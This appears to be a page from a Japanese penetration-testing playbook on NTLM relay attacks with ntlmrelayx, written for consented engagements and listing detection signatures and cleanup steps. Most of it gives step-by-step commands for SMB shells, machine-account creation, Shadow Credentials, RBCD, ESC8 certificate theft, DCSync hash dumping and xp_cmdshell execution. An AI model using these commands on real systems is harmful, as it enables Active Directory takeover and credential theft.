# ntlmrelayx — NTLM リレー攻撃

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（リレー先サービスの認証基盤への直接操作・マシンアカウント作成による AD 変更）
> - [x] 持続化に該当（Shadow Credentials / RBCD 設定はそのままバックドア権限として残る）
> - [ ] 不可逆な設定変更を含む（設定した RBCD・Shadow Credentials は削除可能だが要確認）
> - [x] SIEM/EDR で確実に検知される（Event ID 4624 Type 3・4741（マシンアカウント作成）・4662（LDAP 操作）・MDI の NTLM Relay アラート）
>
> 実施可否は事前合意で明示確認すること。**Relay 先のプロトコル・ホストを書面で限定する。**
> Shadow Credentials・RBCD 設定は試験終了時に必ず削除する。
> 演習環境では制約なし。

---

## 着火条件

以下のすべてが揃ったときに実施する：

- Responder（または Coerce 系ツール）によって **NTLM 認証フローを受け取れる** 状態にある
- 少なくとも1台以上の **リレー先ホスト** が存在する（プロトコル別の条件は後述）

**攻撃者の思考トレース：** NTLM はチャレンジ・レスポンス型の認証プロトコルであり、クライアントから来た認証情報をそのまま別ホストへ「中継」できる。ハッシュをクラックする必要がないため、強いパスワードが設定されていても通用する。リレー先プロトコルによって得られる成果（シェル・権限付与・証明書取得）が異なるため、環境の署名設定を見て最も効果的な経路を選ぶ。

---

## 環境前提

- **実行環境**: テスター端末（Responder と同一マシン推奨。ポイズニングの受け口と Relay 処理を同じ端末で行う）
- **必要なツール**: ntlmrelayx（Impacket 付属・ペネトレ用 Linux ディストリ標準搭載）
- **必要な権限**: テスター端末上での `root` 権限（raw socket / 445 ポートのバインドのため）
- **オフライン代替**: Impacket は pip 経由でインストール可能（`pip install impacket --break-system-packages`）。インターネット遮断環境では事前に whl ファイルを転送しておく
- **必須の前提操作**: Responder の SMB / HTTP を **Off** にしてから ntlmrelayx を起動する（`Responder.md` Step 0 参照）

---

## 観点・着眼点

### 先に確認すること：プロトコル別の署名要件

リレーが成立するかどうかは **リレー先サービスの署名・チャネルバインディング設定** で決まる。
ここを確認せずに起動しても「接続したが認証が通らない」で終わる。

| リレー先 | 必要な条件 | 確認コマンド |
|---------|-----------|------------|
| SMB | ターゲットの SMB Signing が `Not Required` | `nxc smb [TARGET_SUBNET]/[PREFIX] --gen-relay-list relay_targets.txt` |
| LDAP | DC の LDAP Signing が `Not Required`（Server 2019 以降はデフォルトで必須になりつつある） | `nxc ldap [DC_IP] -u '' -p '' 2>&1 \| grep -i signing` |
| LDAPS | LDAP Channel Binding が無効（Extended Protection for Authentication が None） | ldap_shell / `ldapsearch -H ldaps://[DC_IP]` で確認 |
| HTTP / AD CS | 署名なし（WebDAV / WPAD / AD CS WebEnrollment は署名不要） | アクセス可能であれば条件成立 |
| MSSQL | ターゲットの MSSQL 接続が NTLM 認証を受け付けている | `nxc mssql [TARGET_IP] -u '' -p ''` |

### 何が出たら次に何をするか

| シグナル | 判断 |
|---------|------|
| SMB `signing:False` のホストあり | 最も基本的な SMB リレー → シェル取得 / socks モード |
| DC の LDAP Signing が Not Required | LDAP リレー → ユーザー追加・ACL 変更・`--add-computer` |
| LDAP Channel Binding が無効 | LDAPS リレー → `--shadow-credentials` / `--delegate-access`（RBCD） |
| AD CS WebEnrollment エンドポイントが存在 | ESC8 リレー → DC$ の証明書取得 → DCSync |
| 全リレー先で署名が有効 | Relay は不可。Responder でハッシュキャプチャ → クラックに切り替え |

---

## プロトコル別リレーの効果

| リレー先プロトコル | 主な成果 | 署名バイパス要否 |
|----------------|--------|--------------|
| SMB | ファイルアクセス / コマンド実行 / socks セッション | SMB Signing = Not Required |
| LDAP | ユーザー列挙・ACL 変更・マシンアカウント追加 | LDAP Signing = Not Required |
| LDAPS | Shadow Credentials 追加 / RBCD 設定 | Channel Binding = None |
| MSSQL | OS コマンド実行（xp_cmdshell） | NTLM 認証受付 |
| HTTP（AD CS WebEnrollment） | DC$ / ユーザーの証明書取得（ESC8） | 署名不要 |

---

## 手順

### 事前準備（必須）：Relay ターゲットリストの作成

```bash
# [Attacker] SMB Signing が Not Required なホストの一覧を生成
nxc smb [TARGET_SUBNET]/[PREFIX] --gen-relay-list relay_targets.txt
cat relay_targets.txt
# 例: 192.0.2.20, 192.0.2.30 が出力される
```

---

### Step 1: SMB リレー — コマンド実行・ファイルアクセス

リレー先で管理者権限を持つアカウントの認証が来た場合、コマンド実行が可能。

```bash
# [Attacker] SMB リレー：コマンド実行
ntlmrelayx.py \
  -tf relay_targets.txt \
  -smb2support \
  -c "whoami"
```

**インタラクティブシェルを取得する場合（`-i` オプション）：**

```bash
# [Attacker] インタラクティブ SMB シェル（nc で接続して操作）
ntlmrelayx.py \
  -tf relay_targets.txt \
  -smb2support \
  -i

# 別ターミナルでシェルに接続（ntlmrelayx が "Started interactive SMB client shell..." を表示したら）
nc 127.0.0.1 [LOCAL_PORT]
```

---

### Step 2: LDAP リレー — マシンアカウント追加・ACL 変更

DC の LDAP Signing が Not Required の場合。

```bash
# [Attacker] LDAP リレー：新規マシンアカウントを作成する
# 作成されたマシンアカウント名とパスワードが出力される
ntlmrelayx.py \
  -t ldap://[DC_IP] \
  --add-computer [CASE_ID]_RELAY$ [STRONG_MACHINE_PASSWORD]
```

> `[CASE_ID]_RELAY$` はテスト識別子コメントマーカー方式の命名（原状回復時に grep で識別できる）。
> 作成したマシンアカウントはテスト完了時に必ず削除する。

```bash
# 作成したマシンアカウントの削除（原状回復）
bloodyAD -u [USER] -p [PASSWORD] -d [DOMAIN] --host [DC_IP] delObject [CASE_ID]_RELAY$
```

---

### Step 3: LDAPS リレー — Shadow Credentials（msDS-KeyCredentialLink 追加）

LDAP Channel Binding が無効の場合。**証明書ベースで TGT を取得する最も強力な経路の一つ。**

```bash
# [Attacker] LDAPS リレー：ターゲットマシンアカウントに Shadow Credentials を追加
ntlmrelayx.py \
  -t ldaps://[DC_IP] \
  --shadow-credentials \
  --shadow-target [TARGET_MACHINE$]
# → 成功すると「添付した証明書の PFX ファイルパス」と「パスワード」が出力される
```

Shadow Credentials 取得後の流れ：

```bash
# [Attacker] 取得した PFX ファイルで PKINIT 認証 → TGT 取得
python3 PKINITtools/gettgtpkinit.py \
  -cert-pfx [OUTPUT_PFX_PATH] \
  -pfx-pass [PFX_PASSWORD] \
  [DOMAIN]/[TARGET_MACHINE$] \
  [TARGET_MACHINE].ccache

# NT ハッシュの取得
export KRB5CCNAME=[TARGET_MACHINE].ccache
python3 PKINITtools/getnthash.py \
  -key [AS_REP_ENCRYPTION_KEY] \
  [DOMAIN]/[TARGET_MACHINE$]
```

> 原理 → Shadow Credentials は msDS-KeyCredentialLink 属性にテスター生成の公開鍵を書き込み、
> PKINIT（証明書ベース Kerberos）でそのマシンアカウントの TGT を取得する手法。

> **原状回復**：追加した KeyCredential はテスト完了時に削除する。
> `bloodyAD` または `pywhisker` の `--action remove` で削除可能。

---

### Step 4: LDAPS リレー — RBCD 設定（delegate-access）

テスター制御下のマシンアカウントを RBCD（Resource-Based Constrained Delegation）対象として設定し、
任意ユーザーのチケットを取得する。

```bash
# [Attacker] LDAPS リレー：RBCD 設定（テスター側マシンアカウントから対象ホストへの委任を設定）
# 事前に --add-computer でマシンアカウントを作成しておく（Step 2 参照）
ntlmrelayx.py \
  -t ldaps://[DC_IP] \
  --delegate-access \
  --escalate-user [CASE_ID]_RELAY$
# → 対象ホストの msDS-AllowedToActOnBehalfOfOtherIdentity に [CASE_ID]_RELAY$ が追加される
```

RBCD 後の S4U 攻撃フロー → `../Delegation_Attacks/RBCD.md` 参照

---

### Step 5: AD CS ESC8 リレー — DC$ の証明書取得

AD CS の WebEnrollment / CES エンドポイントへのリレー。
DC のマシンアカウント（`DC$`）の認証を受け取り、ドメインコントローラーとして証明書を取得する。
証明書から PKINIT で DC$ TGT → DCSync が可能になる。

**事前準備（必須）：AD CS エンドポイントの確認**

```bash
# [Attacker] AD CS WebEnrollment エンドポイントの存在確認
curl -k http://[CA_SERVER]/certsrv/
# → 認証ダイアログが返ってくれば WebEnrollment エンドポイントが存在する
```

```bash
# [Attacker] ESC8 リレー：DC$ の認証を AD CS HTTP エンドポイントにリレー
ntlmrelayx.py \
  -t http://[CA_SERVER]/certsrv/certfnsh.asp \
  --adcs \
  --template [CERT_TEMPLATE]
# --template には "DomainController" または ESC8 に脆弱なカスタムテンプレートを指定
# → 成功すると DC$ 宛の証明書（Base64 PFX）が出力される
```

ESC8 後の流れ：

```bash
# [Attacker] 取得した証明書で PKINIT → DC$ TGT 取得
python3 PKINITtools/gettgtpkinit.py \
  -pfx-base64 [BASE64_PFX] \
  [DOMAIN]/[DC_HOSTNAME]$ \
  dc.ccache

# DC$ TGT を使って DCSync
export KRB5CCNAME=dc.ccache
impacket-secretsdump \
  -k -no-pass \
  -just-dc-ntlm \
  -target-ip [DC_IP] \
  [DC_HOSTNAME]$@[DC_FQDN]
```

> **Coerce との連携**：ESC8 は Coerce 系（PetitPotam / PrinterBug / DFSCoerce）で DC 自身に認証を強制させることで確実に実行できる。Coerce 手順 → `Coerce.md`

---

### Step 6: MSSQL リレー — OS コマンド実行

```bash
# [Attacker] MSSQL リレー：xp_cmdshell 経由で OS コマンド実行
ntlmrelayx.py \
  -t mssql://[MSSQL_TARGET_IP] \
  -q "EXEC xp_cmdshell 'whoami'"
```

> MSSQL で xp_cmdshell が無効な場合、ntlmrelayx が自動で有効化を試みる。
> 本番では xp_cmdshell の有効化自体が「不可逆な設定変更」扱いになる可能性があるため、事前合意が必要。

---

### Step 7: socks モード — セッションの持続的再利用

リレーで取得した認証済みセッションを SOCKS プロキシ経由で再利用する。
ハッシュをクラックしなくても、取得したセッションを継続的に使えるため汎用性が高い。

```bash
# [Attacker] socks モードで起動
ntlmrelayx.py \
  -tf relay_targets.txt \
  -smb2support \
  -socks
```

ntlmrelayx のコンソールで取得したセッションを確認：

```
ntlmrelayx> socks
Protocol  Target          Username             AdminStatus  Port
--------  --------------  -------------------  -----------  ----
SMB       192.0.2.20      [DOMAIN]\[USER]      TRUE         1080
SMB       192.0.2.30      [DOMAIN]\[USER2]     FALSE        1081
```

```bash
# [Attacker] proxychains 経由でツールを実行（socks5 127.0.0.1 1080 を /etc/proxychains.conf に追記）
proxychains impacket-smbclient //[TARGET_IP]/C$ -U [DOMAIN]/[USER]
proxychains impacket-secretsdump [DOMAIN]/[USER]@[TARGET_IP] -no-pass
```

---

## Drop the MIC（CVE-2019-1040）

**問題のある状況**：通常 NTLM メッセージには MIC（Message Integrity Code）が付与されており、
リレー時に改ざんを検知される。Drop the MIC は MIC フィールドを削除して署名チェックをバイパスし、
通常は Relay 不可の構成（特定の署名設定）でもリレーを可能にする攻撃。

```bash
# [Attacker] Drop the MIC を有効化して Relay（--remove-mic フラグ）
ntlmrelayx.py \
  -tf relay_targets.txt \
  -smb2support \
  --remove-mic
```

> **適用範囲**：CVE-2019-1040 はパッチ未適用の環境（2019年7月以前の KB4493471 未適用ホスト）でのみ有効。
> 現代の環境（パッチ適用済み）では MIC 削除は認証エラーを引き起こす。まず通常の Relay を試み、
> 失敗した場合のみ `--remove-mic` を試す。

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| `Signing is required` エラーが出る | リレー先の署名が有効。別プロトコル（LDAP / LDAPS / HTTP）を試す |
| SMB リレー成功するが管理者でない | 管理者権限がないユーザーの認証を受け取っている。socks モードで活用できる権限を確認 |
| LDAP リレーが失敗する | DC の LDAP Signing が必須になっている。LDAPS リレーへ切り替える |
| LDAPS リレーで Channel Binding エラー | LDAP Channel Binding が有効。Shadow Credentials / RBCD は使えない。ESC8 を試す |
| ESC8 で証明書取得できない | AD CS WebEnrollment が存在しない・HTTPS のみ対応・テンプレートが対象外。Certipy で別の ESC を探す → `../AD_CS/Overview.md` |
| Relay 先が来ない（ポイズニングが来ない） | Responder の Analyze モードで問い合わせが来ているか確認。LLMNR/NBT-NS が GPO で無効化されている場合は Coerce 系へ → `Coerce.md`。IPv6 が有効な環境では `mitm6.md` も検討する |

---

## 注意点・落とし穴

- **Responder の SMB/HTTP が On のまま ntlmrelayx を起動しない**：ポート 445/80 の競合で両方が機能不全になる
- **`--add-computer` で作成したマシンアカウントは必ず削除する**：AD のマシンアカウント数の上限（デフォルトで一般ユーザーは10台）を消費する。テスト識別子コメントマーカー方式でマシンアカウント名を命名しておくと削除漏れを防げる
- **Shadow Credentials の削除漏れはバックドアになる**：`msDS-KeyCredentialLink` にテスター生成の公開鍵が残ると、誰でも対象マシンの TGT を取得できる状態になる
- **RBCD 設定の削除漏れも同様**：`msDS-AllowedToActOnBehalfOfOtherIdentity` に残ったエントリはバックドア権限になる
- **ESC8 は AD CS のネットワークアクセス設定に依存**：WebEnrollment が HTTP でのみアクセス可能なことが前提。HTTPS のみ（証明書バインド付き）の環境では NTLM リレーが困難
- **ntlmrelayx の `-c` でコマンドを実行すると新規サービスが作成される**：Event ID 7045 が必ず記録される。本番では `socks` + `proxychains` 経由での操作（直接コマンド実行を避ける）の方が検知リスクが低い

---

## 検知される挙動

| 観点 | 検知シグネチャ |
|------|-------------|
| Microsoft Defender for Identity (MDI) | 「Suspected NTLM Relay Attack (Exchange Account)」「NTLM Relay to ADCS」アラート |
| Windows イベントログ（DC） | Event ID 4741（マシンアカウント作成）/ Event ID 4662（LDAP オブジェクト操作）/ Event ID 4624 Type 3（NTLM ネットワーク認証） |
| Windows イベントログ（ターゲット） | Event ID 7045（サービス作成）— ntlmrelayx `-c` オプション使用時 |
| Sysmon（ターゲット） | Event ID 3（ネットワーク接続）— 攻撃者 IP からの不審な SMB / LDAP 接続 |
| AD 監査ログ | `msDS-KeyCredentialLink` / `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性変更のオブジェクト変更イベント |
| ネットワーク NDR | 攻撃者 IP → DC(389/636) / CA(80/443) へのリレー的な接続フロー（ポイズニング応答直後に同ポートへ接続） |

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。LDAP 操作・マシンアカウント作成・証明書取得はドメイン全体への影響が直接及ぶ
- **想定されるSIEM/EDR検知**: MDI NTLM Relay アラート / Event ID 4741・4662・4624 / Sysmon Event 3 / サービス作成 Event 7045
- **業務影響リスク**: MSSQL xp_cmdshell 有効化は業務影響あり（実施前合意必須）。SMB リレーのコマンド実行もサービス作成を伴う
- **原状回復必須項目**:
  - ✅ `--add-computer` で作成したマシンアカウントの削除
  - ✅ `--shadow-credentials` で追加した `msDS-KeyCredentialLink` エントリの削除
  - ✅ `--delegate-access` で設定した `msDS-AllowedToActOnBehalfOfOtherIdentity` エントリの削除
  - ✅ MSSQL で有効化した `xp_cmdshell` の無効化
  - ✅ 取得した証明書・TGT・NTLM ハッシュの暗号化保管 → テスト完了時破棄
- **取得情報の取扱**: 証明書・ハッシュ・TGT は暗号化保管、テスト完了後破棄。対象組織との書面合意必須
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：LLMNR / NBT-NS / WPAD ポイズニング（認証フローの捕捉） → `./Responder.md`
- 前：Coerce 系（PetitPotam / PrinterBug / DFSCoerce）による認証強制 → `./Coerce.md`
- 前：IPv6 DNS スプーフィング（LLMNR 無効環境での代替起点） → `./mitm6.md`
- 後（Shadow Credentials 取得後）：PKINIT → NT ハッシュ取得 → DCSync → `../Credential_Dumping.md`
- 後（RBCD 設定後）：S4U2self でチケット取得 → `../Delegation_Attacks/RBCD.md`
- 後（ESC8 証明書取得後）：PKINIT → DC$ TGT → DCSync → `../Credential_Dumping.md`
- 後（ESC8 詳細・AD CS 固有の観点）：ESC8 のエンドポイント確認・Certipy auth 手順 → `../AD_CS/ESC8.md`
- 後（マシンアカウント作成後）：Kerberoasting / AS-REP Roast の候補追加 → `../Kerberos_Attacks/Kerberoasting.md`
